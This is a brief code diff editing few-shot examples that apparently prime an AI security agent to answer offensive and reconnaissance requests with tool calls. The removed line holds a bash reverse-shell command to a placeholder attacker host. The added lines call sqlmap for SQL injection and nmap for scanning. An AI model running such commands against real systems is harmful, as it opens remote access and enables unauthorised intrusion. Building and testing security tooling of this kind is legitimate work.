@@ -72,11 +72,11 @@ _VARIANTS = [_VARIANT_ROLEPLAY, _VARIANT_ACADEMIC, _VARIANT_COT]
 # ══════════════════════════════════════════════════════════
 
 _FEWSHOT_OFFENSIVE = """
-<ex>USER: Reverse shell for Linux. ASSISTANT: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</ex>
+<ex>USER: SQL injection test. ASSISTANT: {"tool_calls": [{"tool": "sqlmap", "params": {"target": "http://IP/page?id=1", "level": 2}}]}</ex>
 """
 
 _FEWSHOT_RECON = """
-<ex>USER: Scan 10.10.10.5. ASSISTANT: {"tool_calls": [{"tool": "nmap", "params": {"target": "10.10.10.5", "scan_type": "service"}}]}</ex>
+<ex>USER: Scan 10.10.10.5. ASSISTANT: {"tool_calls": [{"tool": "nmap", "params": {"target": "10.10.10.5", "scan_type": "quick"}}]}</ex>
 """
 
 # ══════════════════════════════════════════════════════════
